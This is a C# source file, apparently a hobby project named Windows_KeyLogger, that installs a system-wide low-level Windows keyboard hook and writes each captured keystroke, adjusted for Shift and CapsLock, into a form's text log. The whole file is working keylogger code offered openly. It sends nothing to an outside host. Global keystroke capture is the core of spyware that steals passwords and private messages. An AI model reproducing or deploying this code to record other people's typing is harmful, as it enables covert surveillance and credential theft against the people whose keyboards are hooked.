using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Windows_KeyLogger
{
    [Flags]
    enum KBDLLHOOKSTRUCTFlags : uint
    {
        LLKHF_EXTENDED = 0x01,
        LLKHF_INJECTED = 0x10,
        LLKHF_ALTDOWN = 0x20,
        LLKHF_UP = 0x80
    }

    [StructLayout(LayoutKind.Sequential)]
    struct KBDLLHOOKSTRUCT
    {
        public uint vkCode;
        public uint scanCode;
        public KBDLLHOOKSTRUCTFlags flags;
        public uint time;
        public UIntPtr dwExtraInfo;
    }
    public class KeyboardHook
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr hhk, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105;

        delegate int HookProc(int code, int wParam, ref KBDLLHOOKSTRUCT lparam);

        // Create a local version of the HookProc, as just passing the function in causes it to be garbage collected.
        HookProc hookCallbackProc;

        List<Keys> _hookedKeys = new List<Keys>();
        Dictionary<Keys, bool> _hookedKeyStates = new Dictionary<Keys, bool>();
        IntPtr _hook = IntPtr.Zero;

        public event KeyEventHandler KeyDown;
        public event KeyEventHandler KeyUp;
        public Form1 form = null;
        public KeyboardHook(Form1 formTarget)
        {
            hookCallbackProc = new HookProc(hookProc);
            form = formTarget;
        }

        ~KeyboardHook()
        {
            unhook();
        }

        public void addKey(Keys key)
        {
            if (key == Keys.None || _hookedKeys.Contains(key))
            {
                return;
            }

            _hookedKeys.Add(key);
            _hookedKeyStates[key] = false;
        }

        public void removeKey(Keys key)
        {
            if (key == Keys.None || !_hookedKeys.Contains(key))
            {
                return;
            }
            _hookedKeys.Remove(key);
            _hookedKeyStates.Remove(key);
        }

        public void removeAllKeys()
        {
            _hookedKeys.Clear();
            _hookedKeyStates.Clear();
        }

        public bool isKeyDown(Keys key)
        {
            bool down = false;
            if (!_hookedKeyStates.TryGetValue(key, out down))
            {
                return false;
            }
            return down;
        }

        public void hook()
        {
            if (_hook != IntPtr.Zero)
            {
                unhook();
            }
            IntPtr instance = LoadLibrary("User32");
            _hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallbackProc, instance, 0);
        }

        public void unhook()
        {
            if (_hook == IntPtr.Zero)
            {
                return;
            }
            UnhookWindowsHookEx(_hook);
        }
        
        int hookProc(int code, int wparam, ref KBDLLHOOKSTRUCT lparam)
        {
            if (code >= 0 && (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN))
            {
                Keys key = (Keys)lparam.vkCode;

                //if (_hookedKeys.Contains(key))
                //{
                    
                KeyEventArgs args = new KeyEventArgs(key);

                bool NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
                bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                bool Shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
                
                if(form.dicNumpad.ContainsKey(key))
                {
                    form.richLog.AppendText(form.dicNumpad[key]);
                }
                else if(form.dicFunc.ContainsKey(key))
                {
                    form.richLog.AppendText(form.dicFunc[key]);
                }
                else if(form.dicLower.ContainsKey(key))
                {
                    if(Shift)
                    {
                        form.richLog.AppendText(form.dicUpper[key]);
                      
                    }else
                    {
                        if(CapsLock)
                            form.richLog.AppendText(form.dicLower[key].ToUpper());
                        else
                            form.richLog.AppendText(form.dicLower[key]);
                    }
                }
                    

                    //if ((wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) && (KeyDown != null))
                    //{
                    //    _hookedKeyStates[key] = true;
                    //    KeyDown(this, args);
                     
                    //}
                    //else if ((wparam == WM_KEYUP || wparam == WM_SYSKEYUP) && (KeyUp != null))
                    //{
                    //    _hookedKeyStates[key] = false;
                    //    KeyUp(this, args);
                    //}

                    //if (args.Handled)
                    //{
                    //    return 1;
                    //}
                //}
            }

            return CallNextHookEx(_hook, code, wparam, ref lparam);
        }
    }
}
